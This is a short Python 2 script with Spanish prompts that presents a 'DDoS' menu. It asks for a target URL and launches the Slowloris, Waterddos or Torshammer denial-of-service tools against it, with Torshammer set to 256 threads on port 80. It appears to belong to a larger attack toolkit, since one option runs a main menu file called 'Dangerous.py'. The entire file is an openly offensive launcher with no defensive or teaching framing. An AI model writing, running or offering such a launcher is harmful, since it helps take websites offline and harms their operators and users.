#!/usr/bin/python

import sys
import os
import webbrowser
import platform
import subprocess

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def __limpiar():
	if os.name == 'nt':
            os.system('cls')
	else:
            os.system('clear')




def menu():

    __limpiar()
    print '''
\033[1;34m
\033[1;34m      ____  ____       ____
\033[1;34m     |  _ \|  _ \  ___/ ___|
\033[1;34m     | | | | | | |/ _ \___  |
\033[1;34m     | |_| | |_| | (_) |__) |
\033[1;34m     |____/|____/ \___/____/


        \033[1;34mHecho por:\033[1;mJey Zeta
          \033[1;34mVersion:\033[1;mBeta 1.0
          '''
    print '''
            \033[1;32m 1.- Slowloris
            \033[1;32m 2.- Waterddos
            \033[1;32m 3.- Torshammer
            \033[1;32m 4.- Volver al menu principal
        '''

    while True:


        d = raw_input("\033[1;36mDDoS > \033[1;m")

        if d == "1":
            url = raw_input("Url a la que quieres atacar.. :")
            subprocess.call(['perl','AtaqueRedes/ddos/slowloris.pl','-dns',url])
        if d == "2":
            url = raw_input("Url a la que quieres atacar.. :")
            subprocess.call(['python','AtaqueRedes/ddos/waterddos/waterdos.py','-t',url])
        if d == "3":
            url = raw_input("Url a la que quieres atacar.. :")
            subprocess.call(['python','AtaqueRedes/ddos/Torshammer/torshammer.py','-t',url,'-r','256','-p','80'])
        if d == "4":
            subprocess.call(['python','Dangerous.py'])

menu()
